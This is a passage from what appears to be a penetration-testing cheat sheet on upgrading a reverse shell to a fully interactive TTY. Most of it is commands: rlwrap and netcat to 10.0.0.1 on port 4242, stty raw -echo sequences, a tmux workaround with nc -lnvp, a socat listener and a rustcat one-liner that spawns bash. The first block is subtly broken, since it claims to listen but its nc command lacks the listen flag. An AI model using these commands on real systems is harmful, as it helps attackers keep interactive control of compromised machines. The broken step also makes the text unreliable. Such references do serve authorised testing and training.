## Spawn TTY Shell

Listen on the desired port. `rlwrap` enhances the shell, allowing screen clear with `CTRL + L`.

```shell
rlwrap nc 10.0.0.1 4242

rlwrap -r -f . nc 10.0.0.1 4242
```

- `-f .` makes rlwrap use the current history file as a completion word list.
- `-r` puts all words seen on in- and output on the completion list.

Sometimes you want shortcuts, `su`, `nano` and autocomplete in a partially-tty shell.

⚠ OhMyZSH might break this trick; a simple `sh` is recommended.

zsh doesn't handle `stty` the same way bash/sh does. Do not split `stty raw -echo; fg` into two commands — the `-echo` loses effect before you can run `fg`.

```shell
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

⚠ With Windows Terminal + WSL, `CTRL + Z` can freeze the container. Run `nc` inside `tmux` and send a `SIGTSTP` to the nc process.

```shell
# Enter tmux
tmux

# Do your netcat stuff
nc -lnvp 4242

# New window in tmux
ctrl+b c

# Find PID of nc process
ps aux # | grep -i nc | grep -vi grep

# Send SIGTSTP (ctrl+z) to the process
kill -s TSTP <PID>
```

Or use socat for a fully-tty reverse shell:

```shell
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

Or rustcat, which auto-injects the TTY shell command, upgrades the shell, and resets the terminal on exit:

```shell
stty raw -echo; stty size && rcat l -ie "/usr/bin/script -qc /bin/bash /dev/null" 6969 && reset
```
